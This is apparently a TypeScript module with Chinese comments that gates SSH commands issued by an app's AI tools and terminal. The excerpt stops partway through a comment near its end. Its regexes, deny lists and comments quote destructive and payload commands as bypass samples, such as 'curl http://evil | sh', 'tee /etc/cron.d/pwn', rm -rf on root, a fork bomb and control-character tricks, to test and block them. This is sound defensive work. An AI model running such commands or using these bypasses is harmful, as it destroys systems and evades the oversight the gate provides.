/**
 * 命令风险闸（唯一权威）
 *
 * 所有 SSH 命令执行出口都应经过本模块，而不是各自维护一份正则表。
 * AI 的"只读"工具、终端代写、MCP 工具、审批后的重放都必须回到这里，
 * 否则就是"闸只守主路，旁路自己判"（2026-10-09 安全审查抓到的正是这个）。
 *
 * 判据分两层（D4：规则数据化）：
 *   - 数据层 command-rules.json：命令名单、级别、要不要确认/审计/是否不可逆。
 *     加一条命令或调级别改数据文件，不动代码。
 *   - 代码层（本文件）：靠参数结构和正则才能判出来的拦截。
 *     这几条写成数据只会让人误以为"级别可以调低"，所以留在代码里，
 *     并由 denyBaseline.blockDetectors 与 BLOCK_DETECTOR_IDS 对账钉住。
 *
 * 解析层的三条硬规矩（2026-10-09 重写，之前每条都有实测绕过样本）：
 *   1. **先分词、后切段**：引号里的 ; | && 不是分隔符，所以 `bash -c "rm -rf /; echo x"`
 *      的引号体不会被撕成两段而判不出来；
 *   2. **token 归一化**：剥引号、展 `~`/`$HOME`、折叠重复斜杠、去尾斜杠，
 *      `rm -rf "/"`、`rm -rf //`、`chmod 0777 /` 与不带引号的写法同判；
 *   3. **执行位置全覆盖**：`\r` 与 `\n` 都是分隔符（PTY 里 `\r` 就是 accept-line）、
 *      管道下游是解释器就算"把上游内容当代码执行"、反引号与 `$( )` 递归判、
 *      `sudo`/`doas`/`command`/`env VAR=` 剥壳后再判。
 *
 * 不变量（不许放宽）：工具入参永不携带审批字段。级别只用于 UI 标注与卡点，
 * block 级在 assertCommandAllowed() 里无条件拒绝，不接受"已批准"绕过。
 */

import rulesJson from './command-rules.json'

/** 风险等级：block=禁止执行，high/medium=执行但标注并需审批卡点，low=只读查询，safe=未识别 */
export type CommandRiskLevel = 'block' | 'high' | 'medium' | 'low' | 'safe'

export interface CommandVerdict {
  level: CommandRiskLevel
  reason: string
  /** 命中的命令段（用于日志/UI，已截断） */
  matched: string
}

/** 被闸拦下时抛出的错误类型，便于调用方区分"拦截"与"执行失败" */
export class CommandBlockedError extends Error {
  readonly verdict: CommandVerdict
  constructor(verdict: CommandVerdict) {
    super(`高危命令已拦截：${verdict.reason}`)
    this.name = 'CommandBlockedError'
    this.verdict = verdict
  }
}

/** 数据文件里的一条命令规则 */
interface ArgvRule {
  id: string
  /** 命令名数组；写成 '@xxx' 表示引用数据文件同级的名单 */
  commands: string[] | string
  /** null = 只看 argv0；数组 = 参数里还要命中其中之一 */
  subcommands: string[] | null
  level: CommandRiskLevel
  reason: string
  requiresConfirm: boolean
  audit: boolean
  irreversible: boolean
}

interface CommandRules {
  version: number
  protectedTargets: string[]
  powerCommands: string[]
  shellLaunchers: string[]
  readonlyCommands: string[]
  prefixSkips: { commands: string[]; valueFlags: string[] }
  argvRules: ArgvRule[]
  denyBaseline: { mustNotBeBelow: Record<string, CommandRiskLevel>; blockDetectors: string[] }
}

const RULES = rulesJson as unknown as CommandRules

/**
 * 代码实现的结构性拦截器 id
 *
 * 必须与 RULES.denyBaseline.blockDetectors 一一对应，
 * 由 tests/unit/command-gate-rules.test.ts 对账。
 */
export const BLOCK_DETECTOR_IDS: readonly string[] = [
  'forkBomb',
  'rmRfProtectedTarget',
  'deviceDestruction',
  'powerOff',
  'rootPermissionOpen',
  'shellPayloadExecution',
  'protectedPathOverwrite',
  'findDeleteProtected',
]

const LEVEL_RANK: Record<CommandRiskLevel, number> = { safe: 0, low: 1, medium: 2, high: 3, block: 4 }

/** 数据文件里的命名名单引用（'@readonlyCommands' → RULES.readonlyCommands） */
function resolveCommands(commands: string[] | string): string[] {
  if (Array.isArray(commands)) return commands
  if (commands.startsWith('@')) {
    const key = commands.slice(1) as keyof CommandRules
    const target = RULES[key]
    if (!Array.isArray(target)) {
      throw new Error(`command-rules.json: 规则引用了不存在的名单 ${commands}`)
    }
    return target as string[]
  }
  throw new Error(`command-rules.json: commands 字段形状不认识 ${commands}`)
}

/** argv0 → 规则列表（保持数据文件里的顺序，先命中先用） */
const RULES_BY_ARGV0: Map<string, ArgvRule[]> = (() => {
  const map = new Map<string, ArgvRule[]>()
  for (const rule of RULES.argvRules) {
    for (const cmd of resolveCommands(rule.commands)) {
      const list = map.get(cmd) ?? []
      list.push(rule)
      map.set(cmd, list)
    }
  }
  return map
})()

/**
 * 加载时就检查"数据有没有把底线调低"
 *
 * 闸宁可不启动也不要一个被调松的闸：这里抛错会让主进程起不来，
 * 而不是等到漏放一条 rm -rf 才发现。
 */
function assertDenyBaseline(): void {
  for (const [cmd, minLevel] of Object.entries(RULES.denyBaseline.mustNotBeBelow)) {
    const matched = (RULES_BY_ARGV0.get(cmd) ?? []).filter((r) => r.subcommands === null)
    const worst = matched.reduce<CommandRiskLevel>(
      (acc, r) => (LEVEL_RANK[r.level] > LEVEL_RANK[acc] ? r.level : acc),
      'safe'
    )
    if (LEVEL_RANK[worst] < LEVEL_RANK[minLevel]) {
      throw new Error(
        `command-rules.json: ${cmd} 被判成 ${worst}，低于底线要求的 ${minLevel}，拒绝加载`
      )
    }
  }
}
assertDenyBaseline()

/** 受保护的根级目录（rm -rf 目标命中即 block） */
const PROTECTED_TARGETS = new Set(RULES.protectedTargets)

/** 关机/重启类命令 */
const POWER_COMMANDS = new Set(RULES.powerCommands)

/**
 * 管道下游出现这些，就等于"把上游内容当代码执行"。
 * 除了 shell 家族（数据文件里的 shellLaunchers），还包括带 -c/-e 的脚本解释器
 * 与 xargs（把 stdin 当参数批量执行）。
 */
const EXECUTORS = new Set([
  ...RULES.shellLaunchers,
  'python',
  'python2',
  'python3',
  'perl',
  'ruby',
  'node',
  'nodejs',
  'php',
  'xargs',
  'expect',
])

/**
 * 「哪个参数的值是待执行代码」单源表：argv0 → 旗标列表。
 *
 * 两个下游共用，避免各写一份而漂移：
 * - collectorQuotedBodies 取引号体送递归判级
 * - OPAQUE_INTERPRETERS（下面）判"内层不是 shell，shell 规则判不了"
 * 旗标按各语言的真实习惯给：shell 家族 -c/-lc，python -c，perl/ruby -e，
 * node -e，php -r。（旧实现用三元表达式凑，于是 perl 顺带认了 -c/-lc。）
 */
const INTERPRETER_BODY_FLAGS: Map<string, string[]> = new Map([
  ...RULES.shellLaunchers.map((s): [string, string[]] => [s, ['-c', '-lc']]),
  ['python', ['-c']],
  ['python2', ['-c']],
  ['python3', ['-c']],
  ['perl', ['-e']],
  ['ruby', ['-e']],
  ['node', ['-e']],
  ['nodejs', ['-e']],
  ['php', ['-r']],
])

/**
 * 内层不是 shell 脚本语言的执行体。shell 家族递归进去还能用 shell 规则判，
 * Python/Perl/Ruby/Node/PHP 的内层语义 shell 规则判不了 —— 判不了 ≠ 安全。
 * 从上面那张表推导，不再手抄第二份名单。
 */
const OPAQUE_INTERPRETERS = new Set(
  [...INTERPRETER_BODY_FLAGS.keys()].filter((argv0) => !RULES.shellLaunchers.includes(argv0))
)

/**
 * 写目的地命中即 block 的前缀。
 *
 * 只用于"写"的位置（重定向目标、tee 参数、truncate 参数、dd of=），
 * 不用于读参数 —— 否则 `cat /etc/hostname` 这种日常只读会被误伤。
 */
const PROTECTED_WRITE_PREFIXES = [
  '/dev',
  '/etc',
  '/boot',
  '/bin',
  '/sbin',
  '/usr',
  '/lib',
  '/lib64',
  '/root',
  '/proc',
  '/sys',
  '/var/log',
  '/var/lib',
]

/** find 的子句关键字：找起点路径时要跳过它们，否则 `-name foo` 的 foo 会被当成起点 */
const FIND_CLAUSES = ['-type', '-name', '-iname', '-path', '-mtime', '-atime', '-size', '-user', '-group', '-exec', '-execdir', '-ok', '-and', '-or', '-not']

/**
 * find 里"会对文件动手"的旗标 —— 不是查询，是动作。
 *
 * 单独立一份表而不是往 FIND_CLAUSES 里加：那份表的用途是"跳过"，
 * 混在一起只会让起点路径解析跟着变。find 在白名单里，命中这里就必须升出去，
 * 否则 `find / -exec rm -rf {} +` 会被 checkSoftRisk 判成「只读查询命令」。
 */
const FIND_KILL_FLAGS = new Set(['-delete', '-exec', '-execdir', '-ok', '-okdir'])

/** -exec 动作体的结束符：`{}` 之后跟 `+` 或 `;`（`;` 通常已被 scan() 当分隔符切掉） */
const FIND_EXEC_TERMINATORS = new Set(['+', ';'])

// ---------------------------------------------------------------------------
// 解析层：先分词（引号感知），再切段
// ---------------------------------------------------------------------------

interface Token {
  /** 已剥引号的值 */
  value: string
  /** 原来是否被引号包住（决定它是不是"命令体"） */
  quoted: boolean
}

interface Segment {
  text: string
  toks: Token[]
  /** 重定向写目的地（> 与 >>，含 `>"/dev/sda"` 这种贴写形式） */
  writes: string[]
  /** 本段是否处于管道下游 */
  pipedFrom: boolean
}

interface ScanResult {
  segments: Segment[]
  /** 反引号与 $( ) 里的命令体，需要递归评级 */
  embedded: string[]
}

const isSpace = (c: string): boolean => c === ' ' || c === '\t'
/** 命令替换的结束条件：找到配对的右括号 */
function readUntilCloseParen(s: string, from: number): { body: string; next: number } {
  let depth = 1
  let out = ''
  let i = from
  while (i < s.length) {
    const c = s[i]
    if (c === ')') {
      depth -= 1
      if (depth === 0) return { body: out, next: i + 1 }
    } else if (c === '(') {
      depth += 1
    }
    out += c
    i += 1
  }
  return { body: out, next: i }
}

/** 读单引号体：内部无任何展开 */
function readSingleQuoted(s: string, from: number): { value: string; next: number } {
  let i = from + 1
  let out = ''
  while (i < s.length && s[i] !== "'") {
    out += s[i]
    i += 1
  }
  return { value: out, next: Math.min(i + 1, s.length) }
}

/** 读双引号体：保留 \" 转义，内部 `$( )` 与反引号要交出去递归 */
function readDoubleQuoted(
  s: string,
  from: number,
  embedded: string[]
): { value: string; next: number } {
  let i = from + 1
  let out = ''
  while (i < s.length && s[i] !== '"') {
    const c = s[i]
    if (c === '\\' && i + 1 < s.length) {
      out += s[i + 1]
      i += 2
      continue
    }
    if (c === '`') {
      const end = s.indexOf('`', i + 1)
      const body = end < 0 ? s.slice(i + 1) : s.slice(i + 1, end)
      embedded.push(body)
      out += body
      i = end < 0 ? s.length : end + 1
      continue
    }
    if (c === '$' && s[i + 1] === '(') {
      const r = readUntilCloseParen(s, i + 2)
      embedded.push(r.body)
      out += r.body
      i = r.next
      continue
    }
    out += c
    i += 1
  }
  return { value: out, next: Math.min(i + 1, s.length) }
}

/** 读一个不带引号的词，遇到空白或 shell 元字符即止 */
function readPlain(s: string, from: number, embedded: string[]): { value: string; next: number } {
  let i = from
  let out = ''
  while (i < s.length) {
    const c = s[i]
    if (isSpace(c) || c === '\r' || c === '\n' || c === ';' || c === '&' || c === '|' || c === '(' || c === ')') break
    if (c === '<' || c === '>') break
    if (c === "'") {
      const r = readSingleQuoted(s, i)
      out += r.value
      i = r.next
      continue
    }
    if (c === '"') {
      const r = readDoubleQuoted(s, i, embedded)
      out += r.value
      i = r.next
      continue
    }
    if (c === '`') {
      const end = s.indexOf('`', i + 1)
      const body = end < 0 ? s.slice(i + 1) : s.slice(i + 1, end)
      embedded.push(body)
      out += body
      i = end < 0 ? s.length : end + 1
      continue
    }
    if (c === '$' && s[i + 1] === '(') {
      const r = readUntilCloseParen(s, i + 2)
      embedded.push(r.body)
      out += r.body
      i = r.next
      continue
    }
    out += c
    i += 1
  }
  return { value: out, next: i }
}

/**
 * 分词 + 切段。
 *
 * 与旧实现的关键差别：旧实现 `command.split(/(?:&&|\|\||[;|\n()])/)` 是**在引号外面也这么切**，
 * 于是 `bash -c "rm -rf /; echo x"` 被撕成 `bash -c "rm -rf /` 与 ` echo x"` 两段，
 * 两段各自都凑不出一条完整命令，递归又找不到闭合引号 ⇒ 判成 safe。
 */
function scan(command: string): ScanResult {
  const segments: Segment[] = []
  const embedded: string[] = []
  let cur: Segment = { text: '', toks: [], writes: [], pipedFrom: false }

  const flush = (): void => {
    if (cur.toks.length > 0 || cur.writes.length > 0) segments.push(cur)
    cur = { text: '', toks: [], writes: [], pipedFrom: false }
  }

  let i = 0
  while (i < command.length) {
    const c = command[i]

    if (isSpace(c)) {
      i += 1
      continue
    }
    // \r 与 \n 都是"结束当前行"：PTY 里 \r 就是 accept-line，必须当分隔符
    if (c === '\r' || c === '\n' || c === ';') {
      flush()
      i += 1
      continue
    }
    if (c === '&') {
      i += command[i + 1] === '&' ? 2 : 1
      flush()
      continue
    }
    if (c === '|') {
      i += command[i + 1] === '|' ? 2 : 1
      flush()
      cur.pipedFrom = true
      continue
    }
    if (c === '(') {
      flush()
      i += 1
      continue
    }
    if (c === ')') {
      flush()
      i += 1
      continue
    }
    // 重定向：> >> <> 以及带 fd 的 2>；目标就是写目的地
    if (c === '>' || c === '<' || (/[0-9]/.test(c) && /^[0-9]*[<>]/.test(command.slice(i)))) {
      let j = i
      while (j < command.length && /[0-9]/.test(command[j])) j += 1
      const opStart = j
      while (j < command.length && (command[j] === '>' || command[j] === '<')) j += 1
      const op = command.slice(opStart, j)
      while (j < command.length && isSpace(command[j])) j += 1
      const target = j < command.length ? readPlain(command, j, embedded) : { value: '', next: j }
      if (op.includes('>') && target.value) cur.writes.push(target.value)
      cur.text += command.slice(i, target.next)
      i = target.next
      continue
    }

    const t = readPlain(command, i, embedded)
    if (t.value) {
      const quoted = command[i] === "'" || command[i] === '"'
      cur.toks.push({ value: t.value, quoted })
      cur.text += command.slice(i, t.next)
    }
    i = t.next > i ? t.next : i + 1
  }
  flush()
  return { segments, embedded }
}

/**
 * 路径/目标归一化：剥引号、展 `~` 与 `$HOME`、折叠重复斜杠、去尾斜杠。
 *
 * 旧实现拿原文比对，于是 `rm -rf "/"`、`rm -rf //`、`echo x >"/dev/sda"` 全都不命中。
 */
function normTarget(raw: string): string {
  let s = raw.trim().replace(/^['"`]+|['"`]+$/g, '')
  s = s.replace(/^\$\{HOME\}/, '').replace(/^\$HOME/, '').replace(/^~/, '')
  s = s.replace(/\/{2,}/g, '/')
  if (s.length > 1) s = s.replace(/\/+$/, '')
  return s
}

function isProtectedWriteTarget(raw: string): boolean {
  const t = normTarget(raw)
  if (t === '/' || t === '/*') return true
  return PROTECTED_WRITE_PREFIXES.some((p) => t === p || t.startsWith(`${p}/`) || t === `${p}/*`)
}

/** 取真正的命令名：剥 sudo/doas/command/env VAR= 等包装器 */
function baseCommand(toks: Token[]): string {
  const wrappers = new Set(RULES.prefixSkips.commands)
  const valueFlags = new Set(RULES.prefixSkips.valueFlags)
  let i = 0
  while (i < toks.length) {
    const t = toks[i].value
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(t) || wrappers.has(t)) {
      i += 1
      continue
    }
    // sudo -u root / sudo -- 这类"带值旗标"要连值一起跳
    if (valueFlags.has(t)) {
      i += 2
      continue
    }
    // `sudo --` 之后的参数才是真正的命令
    if (t === '--') {
      i += 1
      continue
    }
    break
  }
  const head = toks[i]?.value ?? ''
  return head.split('/').pop() ?? ''
}

/** rm -rf 指向受保护目录（blockDetectors: rmRfProtectedTarget） */
function checkRm(toks: Token[], argv0: string): string | null {
  if (argv0 !== 'rm') return null
  const values = toks.map((t) => t.value)
  const recursive = values.some((t) => /^-[a-z]*[rR][a-z]*$/.test(t) || t === '--recursive')
  const force = values.some((t) => /^-[a-z]*f[a-z]*$/.test(t) || t === '--force')
  if (!recursive || !force) return null
  const targets = values.filter((t) => !t.startsWith('-'))
  return targets.some((t) => {
    const n = normTarget(t)
    return PROTECTED_TARGETS.has(n) || n === '/*'
  })
    ? '递归强制删除根级/系统目录'
    : null
}

/** dd 写块设备、mkfs 格式化、重定向覆写块设备（blockDetectors: deviceDestruction） */
function checkDeviceDestruction(toks: Token[], argv0: string, seg: Segment): string | null {
  if (argv0 === 'mkfs' || /^mkfs\./.test(argv0) || argv0 === 'mkswap') return '格式化磁盘/分区'
  const values = toks.map((t) => t.value)
  if (argv0 === 'dd' && values.some((t) => /^of=\/dev\//.test(normTarget(t.replace(/^of=/, '')) ? t : t))) {
    return 'dd 写入块设备'
  }
  if (argv0 === 'dd' && values.some((t) => /^of=/.test(t) && normTarget(t.slice(3)).startsWith('/dev/'))) {
    return 'dd 写入块设备'
  }
  if (seg.writes.some((w) => normTarget(w).startsWith('/dev/'))) return '重定向覆写块设备'
  return null
}

/** 关机重启（blockDetectors: powerOff；init 0 / telinit 0 才算，init 5 之类不拦） */
function checkPower(argv0: string, toks: Token[]): string | null {
  if (!POWER_COMMANDS.has(argv0)) return null
  const values = toks.map((t) => t.value)
  if (argv0 === 'init' || argv0 === 'telinit') {
    return values[1] === '0' || values[1] === '6' ? '切换运行级别导致关机/重启' : null
  }
  return '关机/重启/停机命令'
}

/** fork 炸弹（blockDetectors: forkBomb；容忍任意空白与 \r） */
function checkForkBomb(command: string): string | null {
  return /:\s*\(\s*\)\s*\{?\s*:\s*\|\s*:\s*&\s*\}?\s*;?\s*:/.test(command) ? 'Fork 炸弹' : null
}

/** 把 0777 / 777 / o+w / a+rw 归一成"是否对其他人放开写权限" */
function isWorldWritableMode(mode: string): boolean {
  const m = mode.trim()
  if (/^[0-7]{3,4}$/.test(m)) {
    const digits = m.replace(/^[0](?=[0-7]{3}$)/, '')
    const other = digits.slice(-1)
    return ['2', '3', '6', '7'].includes(other)
  }
  return /[augo]*\+=[w]|,w|o\+w/.test(m)
}

/**
 * 权限类操作（chmod/chown）视为"系统区"的目录。
 *
 * 刻意不含 /home：放开自己家目录里某个文件的权限是 Linux 初学者的日常操作，
 * 误伤代价大于收益；/etc、/usr 这类目录才是"改了就出事"。
 * 与 PROTECTED_TARGETS 的包含关系由 tests/unit/command-gate-p01.test.ts 钉住，
 * 两份名单不许各漂各的。
 */
const SYSTEM_DIRS = new Set(['/etc', '/usr', '/var', '/boot', '/root', '/bin', '/sbin', '/lib', '/lib64'])

/** 这些文件改权限/属主本身就危险，不看目录层级 */
const SENSITIVE_FILES = new Set([
  '/etc/passwd',
  '/etc/shadow',
  '/etc/sudoers',
  '/etc/fstab',
  '/etc/hosts',
  '/etc/ssh/sshd_config',
  '/etc/crontab',
])

/**
 * 权限类操作的目标是否敏感
 *
 * 旧实现只做**精确目录**匹配，于是 `chmod 777 /etc/passwd` 漏判（/etc/passwd ≠ /etc）。
 * 现在分三层：根本身 → 系统目录本身 → 系统目录下的任意路径（前缀），再加关键文件清单。
 */
function isSensitivePermTarget(n: string): boolean {
  if (/^\/(\*?)$/.test(n)) return true
  if (SYSTEM_DIRS.has(n) || SENSITIVE_FILES.has(n)) return true
  for (const dir of SYSTEM_DIRS) {
    if (n.startsWith(`${dir}/`)) return true
  }
  return false
}

/** chmod 777 / 或 chown -R 指向根级目录（blockDetectors: rootPermissionOpen） */
function checkPerms(toks: Token[], argv0: string): string | null {
  if (argv0 !== 'chmod' && argv0 !== 'chown') return null
  const values = toks.map((t) => t.value)
  const targets = values.filter((t) => !t.startsWith('-'))
  const pathTarget = targets.find((t) => normTarget(t).startsWith('/'))
  if (!pathTarget) return null
  const n = normTarget(pathTarget)
  if (!isSensitivePermTarget(n)) return null
  if (argv0 === 'chmod') {
    const modes = targets.filter((t) => /^[0-7]{3,4}$/.test(t) || /[+w-]/.test(t))
    if (modes.some(isWorldWritableMode)) {
      return n === '/' || SYSTEM_DIRS.has(n)
        ? '将根级目录权限放开为全局可写'
        : `将系统关键路径 ${n} 的权限放开为全局可写`
    }
  }
  if (
    argv0 === 'chown' &&
    values.some((t) => /^-[a-z]*r[a-z]*$/i.test(t) || t === '--recursive')
  ) {
    return '递归改根级目录属主'
  }
  return null
}

/** 写目的地命中系统路径（blockDetectors: protectedPathOverwrite） */
function checkProtectedWrite(toks: Token[], argv0: string, seg: Segment): string | null {
  const values = toks.map((t) => t.value)
  if (seg.writes.some(isProtectedWriteTarget)) return '把内容写进系统关键路径'
  if (argv0 === 'tee') {
    const dest = values.filter((t) => !t.startsWith('-'))
    if (dest.some(isProtectedWriteTarget)) return 'tee 写入系统关键路径'
  }
  if (argv0 === 'truncate') {
    const dest = values.filter((t) => !t.startsWith('-'))
    if (dest.some(isProtectedWriteTarget)) return '清空系统日志/关键文件'
  }
  return null
}

/** find 起点是否落在"不许批量动手"的区域 */
function isProtectedStart(n: string): boolean {
  return n === '/' || PROTECTED_TARGETS.has(n) || n.startsWith('/etc') || n.startsWith('/var')
}

/**
 * 取出 find 里每个 kill 旗标（-exec/-execdir/-ok/-okdir）后面那段待执行 argv。
 *
 * 切分基于 scan() 已经产出的 token（引号剥过、值合过），不再重新解析字符串，
 * 所以 `-exec sh -c 'x' {} ;` 这种带动作体里带引号的也能正确切成 `sh -c x`。
 */
function findExecBodies(seg: Segment, argv0: string): string[] {
  if (argv0 !== 'find') return []
  const values = seg.toks.map((t) => t.value)
  const bodies: string[] = []
  for (let i = 0; i < values.length; i++) {
    if (!FIND_KILL_FLAGS.has(values[i]) || values[i] === '-delete') continue
    let end = values.length
    for (let j = i + 1; j < values.length; j++) {
      if (values[j] === '{}' || FIND_EXEC_TERMINATORS.has(values[j])) {
        end = j
        break
      }
    }
    const body = values.slice(i + 1, end).join(' ').trim()
    if (body) bodies.push(body)
    i = end
  }
  return bodies
}

/** find -delete / find -exec 从系统目录批量动手（blockDetectors: findDeleteProtected） */
function checkFindDelete(toks: Token[], argv0: string): string | null {
  if (argv0 !== 'find') return null
  const values = toks.map((t) => t.value)
  // 起点路径取第一个非旗标、非 find 子句的参数；slice(1) 是为了不把命令名自己当成路径
  const start = values.slice(1).find((t) => !t.startsWith('-') && !FIND_CLAUSES.includes(t))
  const n = normTarget(start ?? '.')

  if (values.includes('-delete')) {
    return isProtectedStart(n) ? 'find -delete 从根级/系统目录批量删除' : null
  }
  // -exec/-execdir/-ok/-okdir：起点是系统目录就直接拦；起点是别处，
  // 危险与否由动作体自己决定（findExecBodies 会把它送进递归判级）
  const flag = values.find((t) => FIND_KILL_FLAGS.has(t))
  if (flag && flag !== '-delete' && isProtectedStart(n)) {
    return `find ${flag} 在根级/系统目录 ${n} 上执行任意命令`
  }
  return null
}

/**
 * 管道下游是解释器 ⇒ 上游内容成为待执行代码
 * （blockDetectors: shellPayloadExecution）
 */
function checkExecutorPipeline(toks: Token[], argv0: string, seg: Segment): string | null {
  if (!seg.pipedFrom) return null
  return EXECUTORS.has(argv0) ? '管道把上游内容交给解释器执行' : null
}

/** 不禁止但需要标注/审批的操作 —— 纯查表 */
function checkSoftRisk(
  toks: Token[],
  argv0: string
): { level: CommandRiskLevel; reason: string; ruleId: string } | null {
  const values = toks.map((t) => t.value)
  for (const rule of RULES_BY_ARGV0.get(argv0) ?? []) {
    if (rule.subcommands && !rule.subcommands.some((sub) => values.includes(sub))) continue
    return { level: rule.level, reason: rule.reason, ruleId: rule.id }
  }
  return null
}

/** 解释器 -c/-e 的引号体：那才是要执行的命令，必须递归评级 */
function collectorQuotedBodies(seg: Segment, argv0: string): string[] {
  if (!EXECUTORS.has(argv0)) return []
  const flags = INTERPRETER_BODY_FLAGS.get(argv0)
  if (!flags) return []
  const values = seg.toks.map((t) => t.value)
  if (!values.some((t) => flags.includes(t))) return []
  return seg.toks.filter((t) => t.quoted && t.value.trim().length >= 4).map((t) => t.value)
}

/**
 * 评估一条命令的风险等级
 *
 * 四条判据并行：fork 炸弹按整条判（切段会把它拆散）、逐段判、
 * 反引号与 `$( )` 的命令体递归判、解释器 `-c` 的引号体递归判。取最坏结果。
 */
export function evaluateCommand(command: string, depth = 0): CommandVerdict {
  const safe: CommandVerdict = { level: 'safe', reason: '未命中风险规则', matched: '' }
  if (!command || !command.trim()) return safe

  let worst: CommandVerdict = safe
  let opaqueSegText = ''
  const raise = (v: CommandVerdict): void => {
    if (LEVEL_RANK[v.level] > LEVEL_RANK[worst.level]) worst = v
  }

  const bomb = checkForkBomb(command)
  if (bomb) return { level: 'block', reason: bomb, matched: command.slice(0, 120) }

  const { segments, embedded } = scan(command)

  for (const seg of segments) {
    const argv0 = baseCommand(seg.toks)
    if (!argv0) {
      // 没有命令名但有写目的地（`> /dev/sda`）也要判
      const w = checkProtectedWrite(seg.toks, '', seg)
      const d = checkDeviceDestruction(seg.toks, '', seg)
      if (w) raise({ level: 'block', reason: w, matched: seg.text.slice(0, 120) })
      if (d) raise({ level: 'block', reason: d, matched: seg.text.slice(0, 120) })
      continue
    }
    const hits: (string | null)[] = [
      checkRm(seg.toks, argv0),
      checkDeviceDestruction(seg.toks, argv0, seg),
      checkPower(argv0, seg.toks),
      checkPerms(seg.toks, argv0),
      checkProtectedWrite(seg.toks, argv0, seg),
      checkFindDelete(seg.toks, argv0),
      checkExecutorPipeline(seg.toks, argv0, seg),
    ]
    for (const reason of hits) {
      if (reason) raise({ level: 'block', reason, matched: seg.text.slice(0, 120) })
    }
    const soft = checkSoftRisk(seg.toks, argv0)
    if (soft) raise({ level: soft.level, reason: soft.reason, matched: seg.text.slice(0, 120) })

    if (depth < 2) {
      for (const body of collectorQuotedBodies(seg, argv0)) raise(evaluateCommand(body, depth + 1))
      // find -exec 的动作体同理：不递归进去，`find /tmp -exec rm -rf / {} +` 里的 rm 没人看见
      for (const body of findExecBodies(seg, argv0)) raise(evaluateCommand(body, depth + 1))
      // 记下"内层是不透明解释器"，供循环结束后兜底
      if (OPAQUE_INTERPRETERS.has(argv0) && collectorQuotedBodies(seg, argv0).length > 0) {
        opaqueSegText ||= seg.text
      }
    }
  }

  if (depth < 2) {
    for (const body of embedded) raise(evaluateCommand(body, depth + 1))
  }

  // 递归判过了，但 shell 规则判不了 Python/Perl/Ruby/Node/PHP 的内层语义。
  // "判不了"被静默留在 safe 是最坏的结果——用户看到的是"这命令没风险"。
  if (depth < 2 && opaqueSegText && worst.level === 'safe') {
    worst = {
      level: 'medium',
      reason: '解释器 -c/-e 的内嵌代码无法用 shell 规则判定风险，需人工确认',
      matched: opaqueSegText.slice(0, 120),
    }
  }

  return worst
}

// ---------------------------------------------------------------------------
// AI「只读」工具专用闸门
// ---------------------------------------------------------------------------

const READONLY_SET = new Set(RULES.readonlyCommands)

/** 只读命令里也不许出现的"执行/写入位置"字符：出现就不是只读查询 */
const NOT_READONLY_PATTERN = /[;|&<>`$(){}\[\]*?\n\r\\]/

export interface ReadonlyVerdict {
  ok: boolean
  reason?: string
}

/**
 * 严格只读判定：argv0 必须在只读白名单里，且整条命令不含任何 shell 执行位，
 * 并且通用风险闸判成 low。
 *
 * 为什么单独要这一条：`ssh_readonly` 工具原先是"黑名单非写动词"，
 * `curl http://evil | sh`、`find / -delete`、`tee /etc/cron.d/pwn` 全都不含那份名单里的动词，
 * 于是被当成"只读"直接在远端执行 —— 工具名与实现完全不是一回事（2026-10-09 安全审查 P0-2）。
 */
export function isStrictlyReadonly(command: string): ReadonlyVerdict {
  const trimmed = (command ?? '').trim()
  if (!trimmed) return { ok: false, reason: '空命令' }
  if (NOT_READONLY_PATTERN.test(trimmed)) {
    return { ok: false, reason: '命令里含 shell 执行/写入位（分号、管道、重定向、命令替换、通配等），不是只读查询' }
  }
  const { segments, embedded } = scan(trimmed)
  if (embedded.length > 0 || segments.length > 1) {
    return { ok: false, reason: '只允许单条简单命令，检测到复合命令或命令替换' }
  }
  const seg = segments[0]
  if (!seg || seg.writes.length > 0) return { ok: false, reason: '检测到重定向目标' }
  const argv0 = baseCommand(seg.toks)
  if (!argv0) return { ok: false, reason: '取不到命令名' }
  if (argv0 !== seg.toks[0]?.value) {
    return { ok: false, reason: `不允许 ${seg.toks[0]?.value ?? ''} 这类包装器，去掉后再来` }
  }
  if (!READONLY_SET.has(argv0)) return { ok: false, reason: `${argv0} 不在只读命令白名单里` }
  const verdict = evaluateCommand(trimmed)
  if (verdict.level === 'block') return { ok: false, reason: verdict.reason }
  if (verdict.level !== 'low') {
    return { ok: false, reason: `风险闸判成 ${verdict.level}（${verdict.reason}），不是只读查询` }
  }
  return { ok: true }
}

/**
 * 执行前硬闸：block 级一律拒绝，不留"已批准"后门。
 *
 * 依据 CLAUDE.md 红线 3——SSH exec 必须经过高危命令拦截；
 * 终端手输与 AI 工具走同一条路，用户在真实终端里仍可执行。
 *
 * @throws CommandBlockedError
 */
export function assertCommandAllowed(command: string): CommandVerdict {
  const verdict = evaluateCommand(command)
  if (verdict.level === 'block') {
    throw new CommandBlockedError(verdict)
  }
  return verdict
}

/** 导出一份数据快照，供 UI/审计侧读级别与确认要求（不含判定逻辑） */
export const COMMAND_RULES_SNAPSHOT = {
  version: RULES.version,
  blockDetectors: RULES.denyBaseline.blockDetectors,
  rules: RULES.argvRules.map((r) => ({
    id: r.id,
    // 命令名给解析后的真实名单：数据文件里 '@readonlyCommands' 这种引用直接显示给用户看不懂
    commands: resolveCommands(r.commands),
    subcommands: r.subcommands,
    level: r.level,
    reason: r.reason,
    requiresConfirm: r.requiresConfirm,
    audit: r.audit,
    irreversible: r.irreversible,
  })),
} as const

// ---------------------------------------------------------------------------
// PTY 逐键写入的风险闸（P0-2）
// ---------------------------------------------------------------------------

/** 输入流里的控制序列：判定前一律抹掉，不进缓冲区 */
const INPUT_ESCAPE_SEQUENCE = /\x1b(\[[0-9;?]*[ -/]*[@-~]|\][^\x07\x1b]*(?:\x07|\x1b\\)|[O()#][0-9;?A-Za-z]?)/g

/**
 * 除 `\t` `\n` `\r` 以外的 C0 控制字符与 DEL：一律不进缓冲。
 *
 * 这不是洁癖，是绕过面 —— 留着 `\x15`（Ctrl-U）的话，用户清行再重打一遍命令，
 * 缓冲里就是 `\x15rm -rf /`，argv0 变成 `\x15rm`，所有按命令名匹配的探测器全部落空，
 * 命令照样被 shell 执行。
 */
const CONTROL_JUNK = /[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g

/** 备用屏（全屏程序）进/出：vim / less / nano / htop 这一类直接接管终端的程序 */
const ALT_SCREEN_ON = /\x1b\[\?(?:1049|1047|47)h/
const ALT_SCREEN_OFF = /\x1b\[\?(?:1049|1047|1048|47)l/

export interface LineGateVerdict {
  /** 是否放行写入 PTY */
  allow: boolean
  /**
